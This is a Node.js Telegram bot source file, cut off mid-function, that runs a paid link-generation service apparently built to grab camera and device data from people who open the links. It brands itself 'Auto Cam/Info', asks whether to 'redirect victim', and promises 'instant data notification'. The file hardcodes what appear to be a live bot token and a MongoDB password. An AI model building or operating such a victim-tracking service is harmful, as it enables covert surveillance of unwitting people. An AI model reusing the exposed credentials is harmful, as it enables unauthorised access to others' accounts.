/**
 * 𝐃𝐗-𝐂𝐎𝐃𝐄𝐗 𝐌𝐎𝐓𝐇𝐄𝐑 𝐒𝐘𝐒𝐓𝐄𝐌 v10.0 (Merged & Fixed)
 * Features: All Old Info + New Group Logic + Auto Cam/Info
 */

const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');

// 🛠 CONFIGURATION
const TOKEN = "8291862788:AAEvXOm7TSrCIjb1TxPm7rleiG_NooTgxdE";
const OWNER_IDS = [6703335929, 6041728084, 5136260272, 7089533955, 6125809347]; 
const CHANNEL_ID1 = "@alphacodex369";
const CHANNEL_ID2 = "@Termuxcodex";
const GROUP_ID = "@Codex_teamx"; 
const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/DEVICEX?retryWrites=true&w=majority";

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ extended: true }));

// ─── 💾 DATABASE ──────────────────────────────────────────

mongoose.connect(MONGO_URI)
    .then(() => console.log('✅ MongoDB Connected'))
    .catch(err => console.error('❌ MongoDB Error:', err));

const userSchema = new mongoose.Schema({
    chatId: { type: Number, unique: true },
    username: String,
    firstName: String,
    coins: { type: Number, default: 0 },
    freeUrlsLeft: { type: Number, default: 4 }, 
    isBanned: { type: Boolean, default: false },
    joinedAt: { type: Date, default: Date.now }
});

const linkSchema = new mongoose.Schema({
    shortId: { type: String, unique: true },
    creatorChatId: Number,
    originalUrl: String, 
    customName: String,
    createdAt: { type: Date, default: Date.now, expires: 86400 } 
});

const User = mongoose.model('User', userSchema);
const Link = mongoose.model('Link', linkSchema);

// [IMPORTANT FIX] Global state variable defined here
const userState = {};

// ─── 🎨 STYLING & HELPERS (FIXED & MOVED TO GLOBAL SCOPE) ─────────────

const fontMap = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'};

function _fnt(text) {
    if(!text) return "";
    return text.split('').map(c => fontMap[c] || c).join('');
}

function makeBorder(title, content) {
    const cleanTitle = title.replace(/<[^>]*>?/gm, ''); 
    const lines = content.split('\n').map(line => `┃ ${line}`).join('\n');
    return `<b>┏━━「 ${_fnt(cleanTitle)} 」━━┓</b>\n${lines}\n<b>┗━━━━━━━━━━┛</b>`;
}

function escapeHtml(text) {
    if (!text) return text;
    return text.toString().replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
}

async function resolveUser(msg, input) {
    if (msg.reply_to_message) return await User.findOne({ chatId: msg.reply_to_message.from.id });
    if (input) {
        const cleanInput = input.trim().replace('@', '');
        if (/^\d+$/.test(cleanInput)) return await User.findOne({ chatId: parseInt(cleanInput) });
        return await User.findOne({ username: { $regex: new RegExp(`^${cleanInput}$`, 'i') } });
    }
    return null;
}

// ─── 🤖 BOT LOGIC (START & MEMBERSHIP) ──────────────────

async function checkMembership(chatId) {
    try {
        const s = ['creator', 'administrator', 'member', 'restricted'];
        const [c1, c2, g1] = await Promise.all([
            bot.getChatMember(CHANNEL_ID1, chatId).catch(() => null),
            bot.getChatMember(CHANNEL_ID2, chatId).catch(() => null),
            bot.getChatMember(GROUP_ID, chatId).catch(() => null)
        ]);
        
        // Check if user is present in all required channels/groups
        const isC1 = c1 && s.includes(c1.status);
        const isC2 = c2 && s.includes(c2.status);
        const isG1 = g1 && s.includes(g1.status);

        return { allJoined: isC1 && isC2 && isG1 };
    } catch (e) { return { allJoined: false }; }
}

// 1. START COMMAND
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    if (msg.chat.type !== 'private') return;

    try {
        let user = await User.findOne({ chatId });
        if (!user) {
            user = new User({ chatId, username: msg.from.username || "Unknown", firstName: escapeHtml(msg.from.first_name) || "User" });
            await user.save();
        }
        
        if (user.isBanned) {
            return bot.sendMessage(chatId, "<b>┏━━「 ʙᴀɴɴᴇᴅ 」━━┓</b>\n┃ <b>🚫: ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ!</b>\n<b>┗━━━━━━━━━━┛</b>", {parse_mode:'HTML'});
        }

        const { allJoined } = await checkMembership(chatId);
        if (allJoined) {
            await showMainMenu(msg);
        } else {
            await showVerificationMenu(msg);
        }
    } catch (error) { console.log(error); }
});

// 2. MAIN MENU (Manual Border)
async function showMainMenu(msg) {
    const chatId = msg.chat.id || msg.from.id;
    const cleanName = escapeHtml(msg.from.first_name || "User");
    const mention = `<a href="tg://user?id=${chatId}">${cleanName}</a>`;
    
    const content = `<b>┏━━「 ${_fnt("DASHBOARD")} 」━━┓</b>
┃ <b>┏─「 ᴜsᴇʀ ᴘʀᴏғɪʟᴇ 」</b>
┃ ┃ 👤 <b>ɴᴀᴍᴇ:</b> ${mention}
┃ ┃ 🆔 <b>ɪᴅ:</b> <code>${chatId}</code>
┃ ┗───────────╼
┃ <b>┏─「 ʙᴏᴛ ғᴇᴀᴛᴜʀᴇs 」</b>
┃ ┃ ✅ <b>ᴄᴜsᴛᴏᴍ ᴜʀʟ ɢᴇɴᴇʀᴀᴛɪᴏɴ</b>
┃ ┃ ✅ <b>ɪɴsᴛᴀɴᴛ ᴅᴀᴛᴀ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ</b>
┃ ┃ ✅ <b>24/ʜ sᴇʀᴠᴇʀ ᴜᴘᴛɪᴍᴇ</b>
┃ ┃ ✅ <b>sᴇᴄᴜʀᴇ ᴅᴀᴛᴀʙᴀsᴇ</b>
┃ ┗───────────╼
┃ <b>┏─「 ʜᴏᴡ ᴛᴏ ᴏᴘᴇʀᴀᴛᴇ 」</b>
┃ ┃ 1️⃣ <b>ᴄʟɪᴄᴋ 'ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ'</b>
┃ ┃ 2️⃣ <b>ᴇɴᴛᴇʀ ᴀ sʜᴏʀᴛ ɴᴀᴍᴇ ғᴏʀ ʟɪɴᴋ</b>
┃ ┃ 3️⃣ <b>sᴇᴛ ᴀ ᴄᴜসᴛᴏᴍ ʀᴇᴅɪʀᴇᴄᴛ ᴜʀʟ</b>
┃ ┃ 4️⃣ <b>sʜᴀʀᴇ ʟɪɴᴋ & ɢᴇᴛ ɪɴsᴛᴀɴᴛ ᴅᴀᴛᴀ</b>
┃ ┗───────────╼
┃ <b>┏─「 sʏsᴛᴇᴍ ɪɴғᴏ 」</b>
┃ ┃ 👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇʀ: DX-CODEX</b>
┃ ┗───────────╼
<b>┗━━━━━━━━━━┛</b>`;

    await bot.sendMessage(chatId, content, {
        parse_mode: 'HTML',
        reply_markup: { 
            keyboard: [[{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" }], [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }]], 
            resize_keyboard: true 
        }
    });
}

// 3. VERIFICATION MENU (Manual Border)
async function showVerificationMenu(msg) {
    const chatId = msg.chat.id || msg.from.id;
    const cleanName = escapeHtml(msg.from.first_name || "User");
    
    const dashboard = `<b>┏━━「 ${_fnt("WELCOME")} 」━━┓</b>
┃ 👋: ʜᴇʟʟᴏ, <a href="tg://user?id=${chatId}">${cleanName}</a>
┃ <b>┏─「 ᴜsᴇʀ ᴘʀᴏғɪʟᴇ 」</b>
┃ ┃ 👤 ɴᴀᴍᴇ: ${cleanName}
┃ ┃ 🆔 ɪᴅ: <code>${chatId}</code>
┃ ┗───────────╼
┃ <b>┏─「 sʏsᴛᴇᴍ ɪɴғᴏ 」</b>
┃ ┃ 👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ: DX-CODEX
┃ ┗───────────╼
<b>┗━━━━━━━━━━┛</b>
<blockquote><b>📢: ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs</b></blockquote>`;

    await bot.sendMessage(chatId, dashboard, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "📢 ᴄʜᴀɴɴᴇʟ 𝟷", url: `https://t.me/${CHANNEL_ID1.replace('@', '')}` }],
                [{ text: "📢 ᴄʜᴀɴɴᴇʟ 𝟸", url: `https://t.me/${CHANNEL_ID2.replace('@', '')}` }],
                [{ text: "👥 ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }],
                [{ text: "✅ ᴠᴇʀɪғʏ", callback_data: "verify_join" }]
            ]
        }
    });
}

        
// ─── 📩 MESSAGES & STATES ─────────────────────────────────

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Admin Commands Bypass (Group/DM)
    if (text && (text.startsWith('/add') || text.startsWith('/rem') || text.startsWith('/ban') || text.startsWith('/unban') || text.startsWith('/users'))) return;
    if ((msg.caption && msg.caption.startsWith('/broadcast')) || (text && text.startsWith('/broadcast'))) return handleBroadcast(msg);

    if (!text) return;

    // Check Ban
    const user = await User.findOne({ chatId: msg.from.id });
    if (user && user.isBanned) return;

    if (text === "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ") {
        if (user.freeUrlsLeft <= 0 && user.coins <= 0) {
            return bot.sendMessage(chatId, makeBorder("⚠️ ɴᴏ ᴄᴏɪɴs", `🚫: ғʀᴇᴇ ᴛʀɪᴀʟ ᴇɴᴅᴇᴅ\n💰: ʙᴜʏ ᴄᴏɪɴs ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ`), {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "💰 ʙᴜʏ ᴄᴏɪɴs", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]] }
            });
        }
        const info = `👤: ${user.firstName}\n🎁: ${user.freeUrlsLeft} ғʀᴇᴇ\n💰: ${user.coins} ᴄᴏɪɴs\n👇: ᴄʜᴏᴏsᴇ ᴛʏᴘᴇ`;
        bot.sendMessage(chatId, makeBorder("ᴄʀᴇᴀᴛᴇ ᴜʀʟ", info), {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "✏️ ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ", callback_data: "create_custom" }, { text: "🎲 ʀᴀɴᴅᴏᴍ ɴᴀᴍᴇ", callback_data: "create_random" }]] }
        });
    } 
    else if (text === "👤 ᴍʏ ɪɴғᴏ") {
        const activeLinkCount = await Link.countDocuments({ creatorChatId: chatId });
        const joinDate = user.joinedAt ? new Date(user.joinedAt).toLocaleDateString() : "N/A";
        
        let freeLine = "";
        if (user.freeUrlsLeft > 0) {
            freeLine = `<b>┃ ┃ 🎁 ғʀᴇᴇ: ${user.freeUrlsLeft}</b>\n`;
        }

        const titleMain = _fnt("YOUR INFO");
        const titleProf = _fnt("USER PROFILE");
        const titleDet = _fnt("PROFILE DETAILS"); 
        const btnText = _fnt("SUPPORT GROUP");

        const infoMsg = 
`<b>┏━━「 ${titleMain} 」━━┓</b>
<b>┃ ┏─「 ${titleProf} 」</b>
<b>┃ ┃ 👤 ɴᴀᴍᴇ: ${user.firstName}</b>
<b>┃ ┃ 🆔 ɪᴅ: <code>${user.chatId}</code></b>
<b>┃ ┗───────────╼</b>
<b>┃</b> 
<b>┃ ┏─「 ${titleDet} 」</b>
<b>┃ ┃ 💰 ᴄᴏɪɴs: ${user.coins}</b>
${freeLine}<b>┃ ┃ 🛡 ʙᴀɴ: ${user.isBanned ? "Yes" : "No"}</b>
<b>┃ ┃ 📅 ᴅᴀᴛᴇ: ${joinDate}</b>
<b>┃ ┃ 🔗 ʟɪɴᴋs: ${activeLinkCount}</b>
<b>┃ ┗───────────╼</b>
<b>┗━━━━━━━━━━┛</b>`;

        bot.sendMessage(chatId, infoMsg, { 
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: `📢 ${btnText}`, url: `https://t.me/${GROUP_ID.replace('@', '')}` }]
                ]
            }
        });
    }
    else if (text === "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ") {
        bot.sendMessage(chatId, makeBorder("ᴅᴇᴠᴇʟᴏᴘᴇʀ", "👨‍💻: ᴄᴏᴅᴇᴅ ʙʏ ᴅx-ᴄᴏᴅᴇx\n🛡: ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄᴏᴅᴇx—ᴛᴇᴀᴍ"), { parse_mode: 'HTML' });
    }
    
    // Custom Link Steps
    else if (userState[chatId]) {
        if (userState[chatId].step === 'await_custom_name') {
            const cleanName = text.trim().replace(/[^a-zA-Z0-9-_]/g, '');
            if(cleanName.length < 3) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ɴᴀᴍᴇ ᴛᴏᴏ sʜᴏʀᴛ"), {parse_mode:'HTML'});
            const exists = await Link.findOne({ shortId: cleanName });
            if(exists) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ɴᴀᴍᴇ ᴛᴀᴋᴇɴ!"), {parse_mode:'HTML'});
            
            userState[chatId].name = cleanName;
            askRedirect(msg, cleanName);
        } else if (userState[chatId].step === 'await_redirect_url') {
            if(!text.startsWith('http')) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜʀʟ ᴍᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ http"), {parse_mode:'HTML'});
            createFinalLink(msg, userState[chatId].name, text.trim());
        }
    }
});

// Callbacks (FIXED CRASH ISSUE HERE)
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const msg = query.message;

    if (data === 'verify_join') {
        try {
            const { allJoined } = await checkMembership(chatId);
            if (allJoined) { 
                // Fix: Answer query immediately to stop loading circle
                await bot.answerCallbackQuery(query.id, { text: "✅ Verified!" });
                
                // Safe delete
                try {
                    await bot.deleteMessage(chatId, msg.message_id);
                } catch(e) { /* Ignore delete error */ }
                
                showMainMenu(query); 
            }
            else {
                bot.answerCallbackQuery(query.id, { text: "⚠️ ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ!", show_alert: true });
            }
        } catch (error) {
            console.error(error);
            // Prevent button freeze on error
            bot.answerCallbackQuery(query.id, { text: "⚠️ Server Error. Try again.", show_alert: true });
        }
    } 
    else if (data === 'create_custom') {
        userState[chatId] = { step: 'await_custom_name' };
        bot.sendMessage(chatId, makeBorder("ᴄᴜsᴛᴏᴍ", "✏️: sᴇɴᴅ ʏᴏᴜʀ ᴄᴜsᴛᴏᴍ ʟɪɴᴋ ɴᴀᴍᴇ"), { parse_mode: 'HTML' });
    } 
    else if (data === 'create_random') {
        askRedirect(query, Math.random().toString(36).substring(7));
    } 
    else if (data === 'use_redirect') {
        userState[chatId].step = 'await_redirect_url';
        bot.sendMessage(chatId, makeBorder("ʀᴇᴅɪʀᴇᴄᴛ", "🌐: sᴇɴᴅ ᴛʜᴇ ᴅᴇsᴛɪɴᴀᴛɪᴏɴ ᴜʀʟ"), { parse_mode: 'HTML' });
    } 
    else if (data === 'no_redirect') {
        createFinalLink(query, userState[chatId].name, null);
    }
});

function askRedirect(msg, name) {
    const chatId = msg.from ? msg.from.id : msg.chat.id;
    userState[chatId] = { name: name, step: 'await_choice' };
    bot.sendMessage(chatId, makeBorder("ᴏᴘᴛɪᴏɴ", `📝: ɴᴀᴍᴇ: ${name}\n❓: ʀᴇᴅɪʀᴇᴄᴛ ᴠɪᴄᴛɪᴍ?`), {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [[{ text: "✅ ʏᴇs", callback_data: "use_redirect" }, { text: "❌ ɴᴏ", callback_data: "no_redirect" }]] }
    });
}

async function createFinalLink(msg, name, redirectUrl) {
    const chatId = msg.from ? msg.from.id : msg.chat.id;
    const user = await User.findOne({ chatId });
    
    if (user.freeUrlsLeft <= 0 && user.coins <= 0) {
        delete userState[chatId];
        return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ɴᴏ ᴄᴏɪɴs/ᴛʀɪᴀʟs ʟᴇғᴛ!"), { parse_mode:'HTML' });
    }

    if (user.freeUrlsLeft > 0) user.freeUrlsLeft -= 1; else user.coins -= 1;
    await user.save();

    await new Link({ shortId: name, creatorChatId: chatId, originalUrl: redirectUrl }).save();
    delete userState[chatId];
    
    const url = `https://code-url-0507.onrender.com/w/${name}`;
    
    bot.sendMessage(chatId, makeBorder("✅ sᴜᴄᴄᴇss", `🔗: ${url}\n\n🔄: ${redirectUrl || 'N/A'}\n💰: ʀᴇᴍᴀɪɴɪɴɢ: ${user.coins}`), { parse_mode: 'HTML' });
}

// ─── 👑 ADMIN COMMANDS (Merged Logic + Styling) ───────────

async function modifyCoins(msg, match, type) {
    if (!OWNER_IDS.includes(msg.from.id)) return; 

    const amount = parseInt(match[1]);
    const inputTarget = match[2]; 
    const targetUser = await resolveUser(msg, inputTarget);

    if (!targetUser) {
        return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ"), {parse_mode:'HTML'});
    }

    if (type === 'add') {
        targetUser.coins += amount;
        await targetUser.save();
        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `✅: ᴀᴅᴅᴇᴅ ${amount} ᴄᴏɪɴs\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
        bot.sendMessage(targetUser.chatId, makeBorder("ʙᴀʟᴀɴᴄᴇ", `💰: +${amount} ᴄᴏɪɴs ᴀᴅᴅᴇᴅ!`), {parse_mode:'HTML'});
    } else {
        targetUser.coins = Math.max(0, targetUser.coins - amount);
        await targetUser.save();
        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `⛔️: ʀᴇᴍᴏᴠᴇᴅ ${amount} ᴄᴏɪɴs\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
    }
}

bot.onText(/\/add\s+(\d+)(?:\s+(.+))?/, (msg, match) => modifyCoins(msg, match, 'add'));
bot.onText(/\/rem\s+(\d+)(?:\s+(.+))?/, (msg, match) => modifyCoins(msg, match, 'rem'));

bot.onText(/\/ban(?:\s+(.+))?/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.from.id)) return;
    const user = await resolveUser(msg, match[1]);
    if(user) { user.isBanned = true; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("ʙᴀɴ", `🚫: ʙᴀɴɴᴇᴅ ${user.firstName}`), {parse_mode:'HTML'}); }
});

bot.onText(/\/unban(?:\s+(.+))?/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.from.id)) return;
    const user = await resolveUser(msg, match[1]);
    if(user) { user.isBanned = false; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("ᴜɴʙᴀɴ", `✅: ᴜɴʙᴀɴɴᴇᴅ ${user.firstName}`), {parse_mode:'HTML'}); }
});

/**
 * 🛠 ADMIN ADVANCED LINK MANAGEMENT (Group & DM Supported)
 * Commands: /ulist, /ulink <id/reply>, /rmlink
 */

// 1. /ulist
bot.onText(/\/ulist/, async (msg) => {
    if (!OWNER_IDS.includes(msg.from.id)) return;

    try {
        const links = await Link.find({});
        if (links.length === 0) return bot.sendMessage(msg.chat.id, "<b>📭 ɴᴏ ᴀᴄᴛɪᴠᴇ ʟɪɴᴋs ɪɴ sᴇʀᴠᴇʀ</b>", {parse_mode:'HTML'});

        const userGroups = {};
        links.forEach(l => {
            if (!userGroups[l.creatorChatId]) userGroups[l.creatorChatId] = 0;
            userGroups[l.creatorChatId]++;
        });

        let report = `📂 <b>ᴀᴄᴛɪᴠᴇ ʟɪɴᴋs sᴜᴍᴍᴀʀʏ</b>\n\n`;
        for (const uid in userGroups) {
            const user = await User.findOne({ chatId: uid });
            report += `👤 <b>${user ? user.firstName : 'Unknown'}</b>\n`;
            report += `🆔 ɪᴅ: <code>${uid}</code>\n`;
            report += `🔗 ʟɪɴᴋs: <b>${userGroups[uid]}</b>\n`;
            report += `────────────────────\n`;
        }

        bot.sendMessage(msg.chat.id, makeBorder("ʟɪɴᴋ ᴍᴀɴᴀɢᴇʀ", report), {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "📝 ʜᴏᴡ ᴛᴏ ʀᴇᴍᴏᴠᴇ", callback_data: "rm_guide" }]] }
        });
    } catch (e) { bot.sendMessage(msg.chat.id, "❌ Error."); }
});

// 2. /ulink
bot.onText(/\/ulink(?:\s+(\d+))?/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.from.id)) return;

    let targetId;
    if (msg.reply_to_message) {
        targetId = msg.reply_to_message.from.id;
    } else if (match[1]) {
        targetId = parseInt(match[1]);
    } else {
        return bot.sendMessage(msg.chat.id, "❌ Please provide a User ID or reply to their message.");
    }

    const userLinks = await Link.find({ creatorChatId: targetId });
    if (userLinks.length === 0) return bot.sendMessage(msg.chat.id, `❌ No active links for <code>${targetId}</code>`, {parse_mode:'HTML'});

    let linkMsg = `👤 <b>ᴜsᴇʀ:</b> <code>${targetId}</code>\n`;
    linkMsg += `📊 <b>ᴀᴄᴛɪᴠᴇ:</b> ${userLinks.length}\n\n`;

    userLinks.forEach((l, i) => {
        linkMsg += `<b>${i + 1}.</b> <code>${l.shortId}</code> | ${l.customName || 'No Name'}\n`;
    });

    bot.sendMessage(msg.chat.id, makeBorder("ᴜsᴇʀ ʟɪɴᴋ ʟɪsᴛ", linkMsg), {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "🗑️ ᴅᴇʟᴇᴛᴇ sᴘᴇᴄɪғɪᴄ", callback_data: `prompt_del_${targetId}` }],
                [{ text: "🔥 ᴅᴇʟᴇᴛᴇ ᴀʟʟ", callback_data: `delall_${targetId}` }]
            ]
        }
    });
});

// 3. Callback Handlers (Buttons)
bot.on('callback_query', async (query) => {
    if (!OWNER_IDS.includes(query.from.id)) return bot.answerCallbackQuery(query.id, { text: "🚫 Access Denied" });

    const [action, type, uid] = query.data.split('_');

    if (query.data === "rm_guide") {
        bot.sendMessage(query.message.chat.id, "📌 <b>ʀᴇᴍᴏᴠᴀʟ ɢᴜɪᴅᴇ:</b>\n\nTo delete specific links:\n<code>/rmlink [ID] 1 3</code>\n\nTo delete everything:\n<code>/rmlink [ID] all</code>", {parse_mode:'HTML'});
    }

    if (action === "delall") {
        const target = query.data.split('_')[1];
        await Link.deleteMany({ creatorChatId: target });
        bot.editMessageText(`✅ All links for <code>${target}</code> removed.`, { chat_id: query.message.chat.id, message_id: query.message.message_id, parse_mode: 'HTML' });
    }
    
    if (query.data.startsWith("prompt_del_")) {
        bot.sendMessage(query.message.chat.id, `👉 Copy & Edit:\n<code>/rmlink ${uid} 1</code>`, {parse_mode:'HTML'});
    }
});

// 4. /rmlink
bot.onText(/\/rmlink\s+(\d+)\s+(.+)/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.from.id)) return;
    const targetId = parseInt(match[1]);
    const input = match[2].trim().toLowerCase();

    if (input === "all") {
        const res = await Link.deleteMany({ creatorChatId: targetId });
        bot.sendMessage(msg.chat.id, `✅ Success! ${res.deletedCount} links removed.`);
    } else {
        const userLinks = await Link.find({ creatorChatId: targetId });
        const nums = input.split(/\s+/).map(n => parseInt(n) - 1);
        
        let count = 0;
        for (let i of nums) {
            if (userLinks[i]) {
                await Link.deleteOne({ _id: userLinks[i]._id });
                count++;
            }
        }
        bot.sendMessage(msg.chat.id, `✅ Removed ${count} specific link(s).`);
    }
});

/**
 * 🛠 ADMIN MENU COMMAND (Private DM Only)
 */
bot.onText(/\/menu/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (!OWNER_IDS.includes(fromId)) return;
    if (msg.chat.type !== 'private') {
        return bot.sendMessage(chatId, "❌ <b>ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ ᴡᴏʀᴋs ɪɴ ʙᴏᴛ ᴅᴍ!</b>", { parse_mode: 'HTML' });
    }

    let menu = `👋 ʜᴇʟʟᴏ ᴀᴅᴍɪɴ, ɪ ᴀᴍ <b>${_fnt("NIKO")}</b>\n`;
    menu += `ʜᴇʀᴇ ᴀʀᴇ ʏᴏᴜʀ ᴘᴏᴡᴇʀғᴜʟ ᴄᴏᴍᴍᴀɴᴅs:\n\n`;

    menu += `👤 <b>ᴜsᴇʀ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n`;
    menu += `├ <code>/data</code> - sʜᴏᴡ ʏᴏᴜʀ ᴘʀᴏғɪʟᴇ\n`;
    menu += `├ <code>/data</code> [ʀᴇᴘʟʏ/ɪᴅ] - ғᴜʟʟ ᴅʙ ɪɴғᴏ\n`;
    menu += `└ <code>/users</code> - ɢᴇᴛ ᴜsᴇʀ ʟɪsᴛ (.ᴛxᴛ)\n\n`;

    menu += `🔗 <b>ʟɪɴᴋ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n`;
    menu += `├ <code>/ulist</code> - ᴀʟʟ ᴀᴄᴛɪᴠᴇ ʟɪɴᴋ ᴜsᴇʀs\n`;
    menu += `├ <code>/ulink</code> [ɪᴅ/ʀᴇᴘʟʏ] - ᴜsᴇʀ ʟɪɴᴋ ʟɪsᴛ\n`;
    menu += `└ <code>/rmlink</code> [ɪᴅ] [ɴᴜᴍ/ᴀʟʟ] - ᴅᴇʟᴇᴛᴇ\n\n`;

    menu += `💰 <b>ᴄᴏɴᴛʀᴏʟ sʏsᴛᴇᴍ</b>\n`;
    menu += `├ <code>/add</code> [ǫᴛʏ] [ɪᴅ/ʀᴇᴘʟʏ] - ᴀᴅᴅ ᴄᴏɪɴs\n`;
    menu += `├ <code>/ban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀ\n`;
    menu += `└ <code>/unban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʟɪғᴛ ʙᴀɴ\n\n`;

    menu += `📝 <b>ᴜsᴀɢᴇ ᴛɪᴘ:</b>\n`;
    menu += `<i>ʏᴏᴜ ᴄᴀɴ ʀᴇᴘʟʏ ᴛᴏ ᴀɴʏ ᴜsᴇʀ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ ᴛʜᴇsᴇ ᴄᴏᴍᴍᴀɴᴅs ɪɴ ɢʀᴏᴜᴘs ᴛᴏ ᴛᴀʀɢᴇᴛ ᴛʜᴇᴍ ɪɴsᴛᴀɴᴛʟʏ.</i>`;

    const menuBorder = (title, body) => {
        return `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
    };

    bot.sendMessage(chatId, menuBorder("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", menu), { 
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "📢 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: "https://t.me/Codex_teamx" }]
            ]
        }
    });
});

/**
 * 📊 USER DATA COMMAND
 */
bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const isOwner = OWNER_IDS.includes(msg.from.id);
    const isGroup = msg.chat.type !== 'private';
    
    let targetUser;
    if (msg.reply_to_message) {
        targetUser = await User.findOne({ chatId: msg.reply_to_message.from.id });
    } else if (match[1]) {
        targetUser = await resolveUser(msg, match[1]);
    } else {
        targetUser = await User.findOne({ chatId: msg.from.id });
    }

    if (!targetUser) {
        return bot.sendMessage(chatId, `<b>❌ ${_fnt("User not found")}</b>`, { parse_mode: 'HTML' });
    }

    try {
        const activeLinkCount = await Link.countDocuments({ creatorChatId: targetUser.chatId });
        const member = await bot.getChatMember(chatId, targetUser.chatId).catch(() => null);
        const status = (member && (['member', 'creator', 'administrator'].includes(member.status))) ? "🟢 ᴏɴʟɪɴᴇ" : "🔴 ᴏғғʟɪɴᴇ";

        let content = "";
        
        if (isOwner) {
            const regDate = targetUser.joinedAt ? new Date(targetUser.joinedAt).toLocaleDateString() : "ɴ/ᴀ";
            content += `👤 ɴᴀᴍᴇ: <b>${targetUser.firstName || 'Unknown'}</b>\n`;
            content += `🆔 ᴜsᴇʀ ɪᴅ: <code>${targetUser.chatId}</code>\n`;
            content += `🏷 ᴜsᴇʀ: @${targetUser.username || 'ɴ/ᴀ'}\n`;
            content += `💰 ᴄᴏɪɴs: <code>${targetUser.coins}</code>\n`;
